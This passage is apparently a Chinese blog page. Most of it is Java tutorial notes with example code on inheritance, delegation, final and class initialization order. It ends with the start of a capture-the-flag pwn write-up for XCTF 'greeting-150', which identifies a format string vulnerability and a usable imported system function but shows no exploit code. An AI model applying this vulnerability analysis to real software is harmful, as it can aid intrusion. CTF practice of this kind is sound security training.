class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BoardGame</span> <span class="keyword">extends</span> <span class="title">Game</span> </span>&#123;</span><br><span class="line">  BoardGame(<span class="keyword">int</span> i) &#123;</span><br><span class="line">	<span class="keyword">super</span>(i);</span><br><span class="line">	System.out.println(<span class="string">"BoardGame constructor"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Chess</span> <span class="keyword">extends</span> <span class="title">BoardGame</span> </span>&#123;</span><br><span class="line">  Chess() &#123;</span><br><span class="line">	<span class="keyword">super</span>(<span class="number">11</span>);</span><br><span class="line">	System.out.println(<span class="string">"Chess constructor"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">	Chess x = <span class="keyword">new</span> Chess();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Output:</span></span><br><span class="line"><span class="comment">Game constructor</span></span><br><span class="line"><span class="comment">BoardGame constructor</span></span><br><span class="line"><span class="comment">Chess constructor</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>如果没有在 BoardGame 构造函数中调用基类构造函数，编译器就会报错找不到 Game()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpaceShipDelegation</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> SpaceShipControls controls =</span><br><span class="line">	<span class="keyword">new</span> SpaceShipControls();</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">SpaceShipDelegation</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Delegated methods:</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">back</span><span class="params">(<span class="keyword">int</span> velocity)</span> </span>&#123;</span><br><span class="line">	controls.back(velocity);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">down</span><span class="params">(<span class="keyword">int</span> velocity)</span> </span>&#123;</span><br><span class="line">	controls.down(velocity);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">forward</span><span class="params">(<span class="keyword">int</span> velocity)</span> </span>&#123;</span><br><span class="line">	controls.forward(velocity);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">left</span><span class="params">(<span class="keyword">int</span> velocity)</span> </span>&#123;</span><br><span class="line">	controls.left(velocity);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">right</span><span class="params">(<span class="keyword">int</span> velocity)</span> </span>&#123;</span><br><span class="line">	controls.right(velocity);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">turboBoost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	controls.turboBoost();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">up</span><span class="params">(<span class="keyword">int</span> velocity)</span> </span>&#123;</span><br><span class="line">	controls.up(velocity);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">	SpaceShipDelegation protector =</span><br><span class="line">	  <span class="keyword">new</span> SpaceShipDelegation(<span class="string">"NSEA Protector"</span>);</span><br><span class="line">	protector.forward(<span class="number">100</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方法被转发到底层 control对象，因此接口与继承的接口是相同的。但是，你对委托有更多的控制，因为你可以选择只在成员对象中提供方法的子集。虽然Java语言不支持委托，但是开发工具常常支持。例如，上面的例子是使用 JetBrains Idea IDE 自动生成的。</p>
<p>如果 Java基类的方法名多次重载，则在派生类中重新定义该方法名不会隐藏任何基类版本。不管方法是在这个级别定义的，还是在基类中定义的，重载都会起作用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Homer</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">char</span> <span class="title">doh</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">	System.out.println(<span class="string">"doh(char)"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="string">'d'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">float</span> <span class="title">doh</span><span class="params">(<span class="keyword">float</span> f)</span> </span>&#123;</span><br><span class="line">	System.out.println(<span class="string">"doh(float)"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1.0f</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Milhouse</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bart</span> <span class="keyword">extends</span> <span class="title">Homer</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">doh</span><span class="params">(Milhouse m)</span> </span>&#123;</span><br><span class="line">	System.out.println(<span class="string">"doh(Milhouse)"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hide</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">	Bart b = <span class="keyword">new</span> Bart();</span><br><span class="line">	b.doh(<span class="number">1</span>);</span><br><span class="line">	b.doh(<span class="string">'x'</span>);</span><br><span class="line">	b.doh(<span class="number">1.0f</span>);</span><br><span class="line">	b.doh(<span class="keyword">new</span> Milhouse());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Output:</span></span><br><span class="line"><span class="comment">doh(float)</span></span><br><span class="line"><span class="comment">doh(char)</span></span><br><span class="line"><span class="comment">doh(float)</span></span><br><span class="line"><span class="comment">doh(Milhouse)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>@Override注释，它不是关键字，但是可以像使用关键字一样使用它。当你打算重写一个方法时，你可以选择添加这个注释，如果你不小心用了重载而不是重写，编译器会产生一个错误消息关键字</p>
<p>protected它表示“就类的用户而言，这是private 的。但对于任何继承它的子类或在同一包中的类，它是可访问的。”（protected 也提供了包访问权限）</p>
<p>一种判断使用组合还是继承的最清晰的方法是问一问自己是否需要把新类向上转型为基类。如果必须向上转型，那么继承就是必要的，但如果不需要，则要进一步考虑是否该采用继承</p>
<p>Java 中，这类常量必须是基本类型，而且用关键字final修饰。你必须在定义常量的时候进行赋值。一个被static和final同时修饰的属性只会占用一段不能改变的存储空间。对于对象引用，final使引用恒定不变。一旦引用被初始化指向了某个对象，它就不能改为指向其他对象。但是，对象本身是可以修改的，Java没有提供使任何对象恒定不变的方法。（你可以自己编写类达到使对象恒定不变的效果）这一限制同样适用数组，数组也是对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Value</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i; <span class="comment">// package access</span></span><br><span class="line"></span><br><span class="line">	Value(<span class="keyword">int</span> i) &#123;</span><br><span class="line">		<span class="keyword">this</span>.i = i;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FinalData</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Random rand = <span class="keyword">new</span> Random(<span class="number">47</span>);</span><br><span class="line">	<span class="keyword">private</span> String id;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">FinalData</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.id = id;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Can be compile-time constants:</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> valueOne = <span class="number">9</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> VALUE_TWO = <span class="number">99</span>;</span><br><span class="line">	<span class="comment">// Typical public constant:</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> VALUE_THREE = <span class="number">39</span>;</span><br><span class="line">	<span class="comment">// Cannot be compile-time constants:</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> i4 = rand.nextInt(<span class="number">20</span>);</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INT_5 = rand.nextInt(<span class="number">20</span>);</span><br><span class="line">	<span class="keyword">private</span> Value v1 = <span class="keyword">new</span> Value(<span class="number">11</span>);</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Value v2 = <span class="keyword">new</span> Value(<span class="number">22</span>);</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Value VAL_3 = <span class="keyword">new</span> Value(<span class="number">33</span>);</span><br><span class="line">	<span class="comment">// Arrays:</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span>[] a = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> id + <span class="string">": "</span> + <span class="string">"i4 = "</span> + i4 + <span class="string">", INT_5 = "</span> + INT_5;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		FinalData fd1 = <span class="keyword">new</span> FinalData(<span class="string">"fd1"</span>);</span><br><span class="line">		<span class="comment">//- fd1.valueOne++; // Error: can't change value</span></span><br><span class="line">		fd1.v2.i++; <span class="comment">// Object isn't constant</span></span><br><span class="line">		fd1.v1 = <span class="keyword">new</span> Value(<span class="number">9</span>); <span class="comment">// OK -- not final</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fd1.a.length; i++) &#123;</span><br><span class="line">			fd1.a[i]++; <span class="comment">// Object isn't constant</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//- fd1.v2 = new Value(0); // Error: Can't</span></span><br><span class="line">		<span class="comment">//- fd1.VAL_3 = new Value(1); // change reference</span></span><br><span class="line">		<span class="comment">//- fd1.a = new int[3];</span></span><br><span class="line">		System.out.println(fd1);</span><br><span class="line">		System.out.println(<span class="string">"Creating new FinalData"</span>);</span><br><span class="line">		FinalData fd2 = <span class="keyword">new</span> FinalData(<span class="string">"fd2"</span>);</span><br><span class="line">		System.out.println(fd1);</span><br><span class="line">		System.out.println(fd2);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：<br>fd1: i4 = 15, INT_5 = 18<br>Creating new FinalData<br>fd1: i4 = 15, INT_5 = 18<br>fd2: i4 = 13, INT_5 = 18<br>因为 valueOne 和 VALUE_TWO都是带有编译时值的final基本类型，它们都可用作编译时常量，没有多大区别。VALUE_THREE是一<br>种更加典型的常量定义的方式：public意味着可以在包外访问，static 强调只有一个，final 说明是一个常量。</p>
<h2 id="空白-final"><a href="#空白-final" class="headerlink" title="空白 final"></a>空白 final</h2><p>空白 final 指的是没有初始化值的 final 属性。编译器确保空白 final 在使用前必须被初始化。这样既能使一个类的每个对象的 final 属性值不同，也能保持它的不变性。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poppet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    Poppet(<span class="keyword">int</span> ii) &#123;</span><br><span class="line">        i = ii;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlankFinal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> i = <span class="number">0</span>; <span class="comment">// Initialized final</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> j; <span class="comment">// Blank final</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Poppet p; <span class="comment">// Blank final reference</span></span><br><span class="line">    <span class="comment">// Blank finals MUST be initialized in constructor</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BlankFinal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        j = <span class="number">1</span>; <span class="comment">// Initialize blank final</span></span><br><span class="line">        p = <span class="keyword">new</span> Poppet(<span class="number">1</span>); <span class="comment">// Init blank final reference</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BlankFinal</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        j = x; <span class="comment">// Initialize blank final</span></span><br><span class="line">        p = <span class="keyword">new</span> Poppet(x); <span class="comment">// Init blank final reference</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> BlankFinal();</span><br><span class="line">        <span class="keyword">new</span> BlankFinal(<span class="number">47</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>你必须在定义时或在每个构造器中执行 final 变量的赋值操作。这保证了 final 属性在使用前已经被初始化过。</p>
<h2 id="final-方法"><a href="#final-方法" class="headerlink" title="final 方法"></a>final 方法</h2><p>使用 final 方法的原因有两个。第一个原因是给方法上锁，防止子类通过覆写改变方法的行为。这是出于继承的考虑，确保方法的行为不会因继承而改变。过去建议使用 final 方法的第二个原因是效率。在早期的 Java 实现中，如果将一个方法指明为 final，就是同意编译器把对该方法的调用转化为内嵌调用。当编译器遇到 final 方法的调用时，就会很小心地跳过普通的插入代码以执行方法的调用机制（将参数压栈，跳至方法代码处执行，然后跳回并清理栈中的参数，最终处理返回值），而用方法体内实际代码的副本替代方法调用。这消除了方法调用的开销。但是如果一个方法很大代码膨胀，你也许就看不到内嵌带来的性能提升，因为内嵌调用带来的性能提高被花费在方法里的时间抵消了。在最近的 Java 版本中，虚拟机可以探测到这些情况（尤其是 hotspot 技术），并优化去掉这些效率反而降低的内嵌调用方法。有很长一段时间，使用 final 来提高效率都被阻止。你应该让编译器和 JVM 处理效率问题，只有在防止方法ß覆写时才使用 final。类中所有的 private 方法都隐式地指定为 final。因为不能访问 private 方法，所以不能覆写它。可以给 private 方法添加 final 修饰，但是并不能给方法带来额外的含义。</p>
<p>“覆写”只发生在方法是基类的接口时。也就是说，必须能将一个对象向上转型为基类并调用相同的方法（这一点在下一章阐明）。如果一个方法是 private 的，它就不是基类接口的一部分。它只是隐藏在类内部的代码，且恰好有相同的命名而已。但是如果你在派生类中以相同的命名创建了 public，protected 或包访问权限的方法，这些方法与基类中的方法没有联系，你没有覆写方法，只是在创建新的方法而已。由于 private 方法无法触及且能有效隐藏，除了把它看作类中的一部分，其他任何事物都不需要考虑到它。</p>
<h2 id="final-类"><a href="#final-类" class="headerlink" title="final 类"></a>final 类</h2><p>当说一个类是 final （final 关键字在类定义之前），就意味着它不能被继承。final 类的属性可以根据个人选择是或不是 final。这同样适用于不管类是否是 final 的内部 final 属性。然而，由于 final 类禁止继承，类中所有的方法都被隐式地指定为 final，所以没有办法覆写它们。你可以在 final 类中的方法加上 final 修饰符，但不会增加任何意义。</p>
<h1 id="类初始化和加载"><a href="#类初始化和加载" class="headerlink" title="类初始化和加载"></a>类初始化和加载</h1><p>一般可以说“类的代码在首次使用时加载“。这通常是指创建类的第一个对象，或者是访问了类的 static 属性或方法。构造器也是一个 static 方法尽管它的 static 关键字是隐式的。因此，准确地说，一个类当它任意一个 static 成员被访问时，就会被加载。首次使用时就是 static 初始化发生时。所有的 static 对象和 static 代码块在加载时按照文本的顺序（在类中定义的顺序）依次初始化。static变量只被初始化一次。</p>
<h2 id="继承和初始化"><a href="#继承和初始化" class="headerlink" title="继承和初始化"></a>继承和初始化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Insect</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> i = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> j;</span><br><span class="line"></span><br><span class="line">    Insect() &#123;</span><br><span class="line">        System.out.println(<span class="string">"i = "</span> + i + <span class="string">", j = "</span> + j);</span><br><span class="line">        j = <span class="number">39</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> x1 = printInit(<span class="string">"static Insect.x1 initialized"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">printInit</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">47</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Beetle</span> <span class="keyword">extends</span> <span class="title">Insect</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> k = printInit(<span class="string">"Beetle.k.initialized"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Beetle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"k = "</span> + k);</span><br><span class="line">        System.out.println(<span class="string">"j = "</span> + j);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> x2 = printInit(<span class="string">"static Beetle.x2 initialized"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Beetle constructor"</span>);</span><br><span class="line">        Beetle b = <span class="keyword">new</span> Beetle();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
</blockquote>
<pre><code>输出：
static Insect.x1 initialized
static Beetle.x2 initialized
Beetle constructor
i = 9, j = 0
Beetle.k initialized
k = 47
j = 39</code></pre><p>当执行 java Beetle，首先会试图访问 Beetle 类的 main() 方法（一个静态方法），加载器启动并找出 Beetle 类的编译代码（在名为 Beetle.class的文件中）。在加载过程中，编译器注意到有一个基类，于是继续加载基类。不论是否创建了基类的对象，基类都会被加载。（可以尝试把创建基类对象的代码注释掉证明这点。） 如果基类还存在自身的基类，那么第二个基类也将被加载，以此类推。接下来，根基类（例子中根基类是 Insect）的 static 的初始化开始执行，接着是派生类，以此类推。这点很重要，因为派生类中 static 的初始化可能依赖基类成员是否被正确地初始化。至此，必要的类都加载完毕，可以创建对象了。首先，对象中的所有基本类型变量都被置为默认值，对象引用被设为 null —— 这是通过将对象内存设为二进制零值一举生成的。接着会调用基类的构造器。本例中是自动调用的，但是你也可以使用 super 调用指定的基类构造器（在 Beetle 构造器中的第一步操作）。基类构造器和派生类构造器一样以相同的顺序经历相同的过程。当基类构造器完成后，实例变量按文本顺序初始化。最终，构造器的剩余部分被执行。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/04/03/greeting/">【XCTF攻防世界】greeting-150</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-03</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/pwn/">pwn</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/pwn/">pwn</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;soinux&#x2F;ctf&#x2F;xctf&#x2F;pwn&#x2F;greeting&#x2F;greeting&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+5Ch] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+9Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please tell me your name... "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !getnline(&amp;v5, <span class="number">64</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Don't ignore me ;( "</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"Nice to meet you, %s :)\n"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>存在格式化字符串漏洞,要注意%s前面已经有18字节的数据</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048490 _system         proc near               ; CODE XREF: nao+37↓p</span><br></pre></td></tr></table></figure>

<ul>
<li>程序导入了system函数</li>
</ul>
